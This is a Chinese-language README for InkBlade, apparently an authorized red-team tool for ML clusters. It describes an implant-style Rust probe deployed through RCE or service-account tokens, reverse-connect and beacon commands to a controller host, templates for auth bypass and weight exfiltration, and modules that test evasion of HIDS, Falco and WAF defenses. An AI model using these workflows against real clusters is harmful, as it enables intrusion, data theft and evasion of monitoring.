# InkBlade（墨刃零）

**面向训练与推理集群的探针式渗透测试产品。**

InkBlade 把一个静态链接的 Rust 探针放进已授权的 Pod，用声明式模板覆盖 ML 基础设施的十层检测，并把证据整理成双语报告、可重放规则包和本地控制台。控制端留在集群之外；目标 Pod 不需要 Python、shell、curl，也不需要下发模块代码。

> **仅限授权使用。** 只对你有书面授权的资产使用 InkBlade。consent 与 ROE 记录哈希钉存，范围、级别、时间窗由代码强制执行；写操作必须有备份回执。没有签署记录就不投放探针，也没有跳过闸门的开关。

## 核心能力

### 十层检测

每一层都是一组可独立执行的模板。模板声明输入、步骤、检查项、发现和产物；探针执行模板并回传证据。

| 层 | 能做什么 | 代表模板 |
|---|---|---|
| 1. 架构层 | 审计 rail 与多平面错配、PD 分离 KV 通道、IMEX/ComputeDomain 边界、MoE/EP 集合通信入组、长上下文 KV 生命周期、多集群联邦 | `rail-mismatch-forcing`、`prefill-decode-kv-channel-unauth`、`nvlink-imex-isolation`、`nccl-collective-join` |
| 2. 产品 / 框架层 | 枚举 vLLM、SGLang、TRL、verl、AReaL、SkyRL、OpenRLHF、slime、LLaMA-Factory、ms-swift、Megatron-LM、DeepSpeed、transformers、推理网关与 Agent 平台的管理面；检查插件路由、dev 模式、反序列化 sink 与权重导出路径 | `vllm-plugin-auth-bypass`、`sglang-admin-failopen`、`verl-prime-code-exec`、`msswift-trust-remote-code` |
| 3. 组件 / Operator 层 | 检查 Ray 与 LWS 控制面、GPU Operator 与驱动容器、DRA 设备策略、CSI 节点插件、BMC/Redfish 端点与 DPU offload | `ray-dashboard-job`、`gpu-operator-driver-audit`、`gpu-dra-mig-policy`、`redfish-default-credentials` |
| 4. 网络 / fabric 层 | 验证 hostNetwork、SR-IOV、macvlan 上的策略旁路，CNI 双控制面，IB 子网管理器与分区，RoCE PFC/ECN，SHARP 在网聚合，NCCL bootstrap 与 DNS 发现 | `multus-sriov-rdma-bypass`、`ib-sm-partition-audit`、`roce-pfc-storm`、`sharp-in-network-poison` |
| 5. 数据 / 权重层 | 检查 checkpoint 与优化器分片、数据集管道、Hugging Face 缓存、权重桶、模型注册表与 KV/前缀缓存条目 | `checkpoint-shard-poison`、`skyrl-fetch-weights-traversal`、`model-registry-exposure` |
| 6. 租户 / 隔离层 | 度量 MIG 与 MPS 残留、GPU 池化调度器、`cache_salt` 策略与路由指标泄露 | `gpu-tenant-residue`、`hami-scheduler-auth-gap`、`cache-salt-policy-audit` |
| 7. 供应链 / 身份层 | 核验 `trust_remote_code`、revision 固定、证明链、SBOM、IRSA 与工作负载身份、IMDS 可达性与凭据暴露 | `trust-remote-code-supply-chain`、`gpu-cc-attestation-chain`、`cloud-irsa-trust-wildcard` |
| 8. 缓存安全层 | 测试跨租户前缀缓存、语义缓存误命中、逐出残留、远程 KV 池、EPP 指标与 TTFT 时序 | `prefix-cache-cross-tenant-leak`、`similarity-cache-false-hit`、`remote-kv-pool-isolation`、`cache-timing-sidechannel` |
| 9. 跨组合层 | 只在两个或三个组件相遇时才成立的发现，只报一次，并把组件级记录并入组合 | `vllm-plugin-auth-bypass` + `sglang-weight-exfil`、`imex-computedomain-gpu-memory-crossing`、`long-context-cache-leak` |
| 10. 防护绕过层 | 测试哪些绕过变体能躲过 HIDS、运行时 eBPF、准入控制、镜像扫描、主机代理、WAF 与流量可视化，哪些会被检测；每类技术输出 bypassed / detected / 盲区与硬化建议，并反哺规则包 | `defense-bypass-elkeid`、`defense-bypass-falco`、`defense-bypass-admission`、`defense-bypass-waf-inference` |

11 个 `defense-bypass-*` 模块覆盖 Elkeid、AgentSmith-HIDS、veinmind、Falco、Tetragon、KubeArmor、Kyverno/Gatekeeper、Trivy/grype、Wazuh/Osquery、ModSecurity/Coraza/雷池与 Cilium Hubble/Calico。它们使用良性 marker，并把观测结果沉淀为规则包。

### 平台能力

- **一条执行路径。** 立足 → Rust 探针 → 帧通道 → Pod 内任务 → 子探针 → 证据。检测、逃逸和横向都走这条路径。
- **目标侧零解释器。** 探针是静态二进制，模板是 JSON 数据。distroless 或 scratch 推理镜像与 Python 镜像跑同一套模板。
- **探针树。** `probe_id` 与 `parent_id` 记录每颗探针的位置；子探针继承更严格的预算与白名单，深度与扇出有上限，清理先子后父。
- **Agent 运行时。** 带预算的规划器执行目标图，记录每次观察与决策，可从持久 journal 恢复，也可零执行回放。
- **跨集群中继。** 中继用同一套帧协议连接集群，让一次项目覆盖多个集群并留下覆盖证明。
- **证据在边界产生。** 任务结果、步骤日志、产物、SHA-256 manifest、流量表、探针身份与清理回执。
- **规则可重放。** 准入、运行时、网络三类规则包，输出拦截 / 检出 / 漏过矩阵。
- **报告与控制台。** 双语渗透报告与修复报告，SARIF / OCSF / VEX 导出，本地 Web 控制台展示发现、图与时间线。

### 漏洞研究

模板目录背后有 184 条漏洞记录，每条写清组件、受影响版本、根因、影响与检测方式；其中 68 条有可运行 PoC。研究队列包含 169 个零日候选，47 个经查新确认新颖，46 个可进入协调披露，39 个是独立的利用原语。103 条受影响版本记录与 121 条检测规则支撑 29 条攻击链。公开台账（`docs/0DAY-PUBLIC.md`）只列组件、类别、受影响版本与披露状态，利用细节不公开。

### Rust 探针

linux/amd64 与 linux/arm64 各一个静态 musl 二进制，执行 286 个模板。模板是 JSON 数据；目标侧不需要解释器。

`collect` · `exec` · `audit-exec` · `read-file` · `list-files` · `upload` · `download` · `spawn` · `dial` · `socks` · `beacon` · `cleanup`

每个操作都受预算与范围约束，并写入证据库；探针树先子后父清理。

### 代理协议支持

回连传输：TLS、WSS、HTTPS、QUIC、WebTransport（experimental）、MASQUE。ML 服务代理：gRPC、Redis、TCPStore、NCCL、UCX、ZMTP（experimental）。SOCKS5 仅回环（`127.0.0.1`），用于本地工具兼容。

每个帧都带 token 与 HMAC 认证；TLS 传输校验控制端证书 pin（SHA-256），可选 CA 文件。

## 工作流

| # | 阶段 | 发生什么 | 产物 |
|---:|---|---|---|
| 1 | 立足 | 会话记录你已有的入口：`foothold`（shell、ServiceAccount token 或授权 RCE）或 `external`（有界可达性证明）；`kubeconfig` 是可选的批量 bootstrap 模式 | 会话记录、审计轨迹 |
| 2 | Rust 探针 | 静态探针经立足点投放 —— ServiceAccount token、RCE 回调，或可选的 `kubectl` 路径；foothold/external 入口不需要 kubeconfig | 探针身份、SHA-256 |
| 3 | 通道 | 控制端监听，探针从 Pod 内主动回连；存在本地命令通道时也可用 stdio 通道 | 通道状态、任务日志 |
| 4 | 检测 | 模板在 Pod 内按十层执行；每个结果带步骤、检查项、发现与产物 | 发现、证据锚 |
| 5 | 逃逸 | 通过范围内的 Operator、驱动、CSI、运行时与内核面测试容器与节点边界 | 逃逸路径、证明 |
| 6 | 横向 | 从探针所在网络命名空间测绘服务、控制面、网关与 fabric 可达性 | 可达图、跳板 |
| 7 | 多探针 | 子探针由父探针用 `probe upload` + `probe spawn` 投放并回连控制端；每个子探针有独立 token 和更严格的预算 | 探针树、血缘 |
| 8 | 跨集群 | `agent relay` 连接多个集群；`agent coverage` 记录目标图里哪些节点已闭合、哪些不可达 | 中继状态、覆盖证明 |
| 9 | 报告 / 规则 / 可视化 | 双语报告、SARIF/OCSF/VEX 导出、可重放规则包与本地控制台 | 报告、规则包、控制台 |

## 快速开始

从控制台开始，接入你已有的探针或立足点。kubeconfig 不是前置条件。

| 入口 | 适用场景 | kubeconfig |
|---|---|---|
| `foothold` | 默认：普通/最低权限 Pod（非 root、无 hostPath/privileged、仅出站 TCP），已有 shell、SA token 或授权 RCE | 不需要 |
| `external` | 目标可达，并能附上有界可达性证明 | 不需要 |
| `kubeconfig` | 可选的首次批量 bootstrap，一次投放多颗探针 | 可选 |

```bash
# 1. 安装并启动控制台
python -m pip install -e .
python -m inkblade up

# 2. 浏览器登录
#    控制台打印一次性 admin 密码，监听 127.0.0.1:8765。

# 3. 接入已有探针：探针主动回连控制端
python -m inkblade channel listen \
  --bind 0.0.0.0 --port 9443 --transport tls \
  --token-file ./probe.token --workspace local-lab
#    Pod 内：
#    ./inkblade-probe reverse --transport tls --host <controller> --port 9443 \
#      --ca-file ca.pem --pin <sha256> --sni <name> \
#      --token-file /tmp/probe.token --probe-id pod-a
python -m inkblade probe list

# 4. 从最低权限立足点首次投放（只需出站 TCP）
python -m inkblade session open \
  --mode foothold \
  --target <target> \
  --credential-source pod-shell \
  --namespace <namespace> \
  --pod <pod>

python -m inkblade probe deploy \
  --session <session-id> \
  --via rce \
  --binary ./inkblade-probe-linux-amd64 \
  --probe-token-file ./probe.token \
  --allow-write

# 5. 用 Agent 通过探针通道执行
python -m inkblade agent run \
  --probe <probe-id> \
  --objective read-only-recon \
  --workspace ./work

# 6. 出报告
python -m inkblade report --run <run-id> --lang bi
```

`inkblade up` 创建工作区、打印一次性 admin 密码，并在回环地址上提供控制台；在浏览器里登录。首次投放前用 `inkblade quickstart`（或控制台）签署授权记录：目标、范围、级别与时间窗。

默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。控制端用 `channel listen` 监听，Pod 内探针用 `inkblade-probe reverse --host <controller> --port <port>` 主动回连。还没有探针时，`session open --mode foothold` 记录你已有的 shell、SA token 或授权 RCE，`probe deploy --via rce|sa-token` 通过它投放第一颗探针。子探针由父探针用 `probe upload` + `probe spawn` 投放，并以同样方式回连。存在本地命令通道时仍可用 stdio 通道（`channel start --session <id>`），但默认路径不依赖它。

**文档站点。** 公网页面：https://lupingqaq.github.io/inkblade/ ，由 `docs/` 构建、从 `gh-pages` 分支发布。离线或本地预览：`python -m inkblade docs` → `http://127.0.0.1:8766/`，默认自动打开浏览器；`--no-browser`、`--port`、`--bind` 用于无界面或换监听地址。

**可选：首次批量投放使用 kubeconfig。** 如果你持有运维 kubeconfig，想一次给多个 Pod 做 bootstrap，仍可使用 `session open --mode kubeconfig --kubeconfig <path>` 与 `probe deploy --via kubectl`。上面的探针优先流程不依赖它。

## 命令表

| 任务 | 命令 |
|---|---|
| 接入向导 | `inkblade up` |
| 授权记录 | `inkblade quickstart`、`inkblade roe` |
| 会话 | `inkblade session open` / `status` / `close` / `run` |
| 探针投放 | `inkblade probe deploy` / `list` / `collect` / `exec` / `read-file` / `list-files` / `upload` / `download` / `spawn` / `cleanup` |
| 通道 | `inkblade channel listen` / `start` / `status` / `stop` |
| 单模板 | `inkblade session run --id <session> --module <key>` 或 `inkblade run --module <key>` |
| 链执行 | `inkblade execute --chain <id> --dry-run`，确认后 `inkblade execute --chain <id>` |
| Agent | `inkblade agent run` / `status` / `trace` / `resume` / `replay` / `stop` |
| 跨集群 | `inkblade agent relay add\|list\|status`、`inkblade agent coverage status\|proof` |
| 报告 | `inkblade report --run <id> --lang bi --kind pentest\|remediation` |
| 导出 | `inkblade export --run <id> --format sarif\|ocsf\|vex` |
| 规则包 | `inkblade rules generate`、`inkblade rules validate` |
| 控制台 | `inkblade ui` |
| 文档站点 | `inkblade docs --port 8766 --bind 127.0.0.1` |
| 模板 | `inkblade template list` / `get` / `plan` / `validate` |

## 部署

**Wheel**

```bash
python -m pip wheel . --no-deps -w dist/
python -m pip install --no-index --find-links dist/ inkblade
```

**Docker**

```bash
docker build -t inkblade:0.2.0 .
docker run --rm -v inkblade-data:/data inkblade:0.2.0 up
```

**Helm**

```bash
helm install inkblade deploy/helm/inkblade \
  --namespace inkblade --create-namespace
```

Chart 以 uid 10001 运行，根文件系统只读，证据落在 PVC。默认只授予读动词；写动词要同时打开 `readOnly=false` 与 `rbac.allowWrite=true`，并且工作区里有签署记录。卸载不删除 PVC，证据要比 release 活得久。

## 安全与授权

- **先有 RoE。** `quickstart` 写出 consent 记录：目标、范围、级别、时间窗与应急联系人。记录做哈希，哈希跟着每一次 run 走；过期或越界的 run 以退出码 91 拒绝。
- **默认只读。** 采集、HTTP/TCP 探测、读文件、只读命令与只读模板不需要额外开关。写操作要过五道闸门：会话级别、`--allow-write`、`meta.writes`、`backup-write` 模式与备份回执。
- **备份与回滚。** 写模块先快照、再执行、两者都记录。`inkblade rollback --run <id> --step <n>` 恢复单步并打印回执；恢复不了的步骤作为发现报出。
- **审计与证据。** 每次探针动作、文件读取、exec 调用与任务结果都写入证据库，并带 SHA-256 manifest。报告把每条发现锚定到 task、step、artifact、probe 或 manifest 哈希。
- **急停。** `inkblade abort` 置位工作区停止开关，解除前所有 run 拒绝执行。

## 许可

Apache-2.0。允许商用、fork 与嵌入服务；保留 `LICENSE` 与 `NOTICE`。文档索引：[`docs/DOC-INDEX.md`](docs/DOC-INDEX.md)。
